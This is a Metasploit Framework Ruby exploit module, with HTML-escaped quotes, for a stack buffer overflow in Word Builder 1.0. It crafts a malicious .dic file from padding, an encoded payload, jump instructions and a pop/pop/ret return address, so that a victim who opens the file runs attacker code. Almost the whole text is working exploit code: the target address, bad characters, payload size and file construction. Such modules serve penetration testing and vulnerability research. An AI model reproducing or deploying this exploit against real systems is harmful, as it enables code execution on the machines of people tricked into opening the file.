# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Word Builder 1.0 (DIC File) Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow in Word Builder 1.0.  An attacker must send the file to the victim and the victim must open the file.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [
                          &#039;h1ch4m&#039;,      # Initial Discovery
                          &#039;James Fitts&#039; # Metasploit Module
                        ],
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17086&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1500,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x00411ce2 } ], #p/p/r in word_builder.exe
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Apr 01 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.dic&#039;]),
                ], self.class)
    end
 
    def exploit
 
        dic = rand_text_alpha_upper(4103 - payload.encoded.length) + payload.encoded
        dic << "\xe9\xfe\xef\xff\xff" # jmp $-4093
        dic << "\x90\x90\xeb\xf7" # jmp $-7
        dic << [target.ret].pack(&#039;V&#039;)
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(dic)
 
    end
 
end



